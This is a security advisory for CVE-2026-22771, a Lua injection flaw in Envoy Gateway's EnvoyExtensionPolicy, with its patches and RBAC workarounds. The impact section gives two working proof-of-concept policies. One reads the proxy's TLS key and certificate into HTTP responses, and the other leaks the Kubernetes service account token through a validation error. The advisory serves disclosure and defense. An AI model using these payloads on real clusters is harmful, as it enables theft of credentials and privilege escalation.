# Envoy Extension Policy lua scripts injection causes arbitrary command execution

**GHSA**: GHSA-xrwg-mqj6-6m22 | **CVE**: CVE-2026-22771 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-94

**Affected Packages**:
- **github.com/envoyproxy/gateway** (go): >= 1.6.0-rc.0, < 1.6.2
- **github.com/envoyproxy/gateway** (go): < 1.5.7

## Description

### Impact
Envoy Gateway allows users to create Lua scripts that are executed by Envoy proxy using the `EnvoyExtensionPolicy` resource. Administrators can use Kubernetes RBAC to grant users the ability to create `EnvoyExtensionPolicy` resources. Lua scripts in policies are executed in two contexts:
* An `EnvoyExtensionPolicy` can be attached to Gateway and xRoute resources. Lua scripts in the policy will process traffic in that scope.
* Lua scripts are interpreted and run by the Envoy Gateway controller pod for validation purposes. 

Lua scripts executed by Envoy proxy can be used to leak the proxy's credentials. These credentials can then be used to communicate with the control plane and gain access to all secrets that are used by Envoy proxy, e.g. TLS private keys and credentials used for downstream and upstream communication. 

For example, the following EnvoyExtensionPolicy, when executed by Envoy proxy, will leak the proxy's XDS client certificates.  

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: EnvoyExtensionPolicy
metadata:
  name: lua-leak
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: leak
  lua:
    - type: Inline
      inline: |
           function envoy_on_response(response_handle)
             local cert = io.open("/certs/tls.crt", "r")
             local content
             if cert then
                content = cert:read("*all")
                cert:close()
             else
                content = "file-not-found"
             end
             local keyfile = io.open("/certs/tls.key", "r")
             local contentkey
             if keyfile then
                contentkey = keyfile:read("*all")
                keyfile:close()
             else
                contentkey = "file-not-found"
             end
             local keypair = contentkey .. "\n" .. content
             response_handle:body():setBytes(keypair)
             response_handle:headers():replace("content-length", tostring(#keypair))
             response_handle:headers():replace("content-type", "text/plain")
           end
```

This execution can lead to arbitrary code execution in the Envoy Gateway controller pod. Attackers can leverage this to achieve privilege escalation. For example, the following `EnvoyExtensionPolicy` will read the Envoy Gateway K8s service account token and return it in an error which will be displayed in the resource status. 

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: EnvoyExtensionPolicy
metadata:
  name: lua-leak
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: backend
  lua:
    - type: Inline
      inline: |
        function envoy_on_response(response_handle)
          local token = io.open("/var/run/secrets/kubernetes.io/serviceaccount/token", "r")
          local content
          if token then
             content = token:read("*all")
             token:close()
          else
             content = "file-not-found"
          end
          io.write(content)
          error(content)
        end
```

Results in:

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: EnvoyExtensionPolicy
metadata:
  name: lua-leak
[...]
status:
  ancestors:
    - ancestorRef:
        group: gateway.networking.k8s.io
        kind: Gateway
        name: eg
        namespace: default
      conditions:
        - lastTransitionTime: "..."
          message: "Lua: validation failed for lua body in policy with name envoyextensionpolicy/default/lua-leak/lua/0:
        failed to validate with envoy_on_response: <string>:622: [REDACTED TOKEN]\nstack
        traceback:\n\t[G]: in function 'error'\n\t<string>:622: in function 'envoy_on_response'\n\t<string>:625:
        in main chunk\n\t[G]: ?."
```

Attackers can then use this token to steal other secrets, run arbitrary pods in the envoy-gateway-system namespace and delete Envoy Gateway itself.  

### Patches
The patch sets secure defaults and addresses lack of guardrails allowing arbitrary Lua execution:
* Runs Lua `Strict` validation by default in Envoy Gateway along with a security hardening module. This module blocks dangerous Lua code that may be executed in proxy and controller pods.
* Renamed `Syntax` to `InsecureSyntax` validation mode to signify that in this validation mode Lua won't be validated for possible security gaps.
* Supports a new `disableLua` option in EnvoyProxy that rejects EnvoyExtenstionPolicies with Lua scripts entirely, blocking the option to execute arbitrary Lua code.

### Workarounds
Envoy Gateway users can create Kubernetes RBAC rules (see [docs](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)) that apply on EnvoyExtensionPolicy resources to restrict creation of these Lua policies to trusted namespaces. Note that this restriction will apply to all EnvoyExtensionPolicies, regardless of the extensibility option that is used (Lua, Wasm or Ext-Proc).
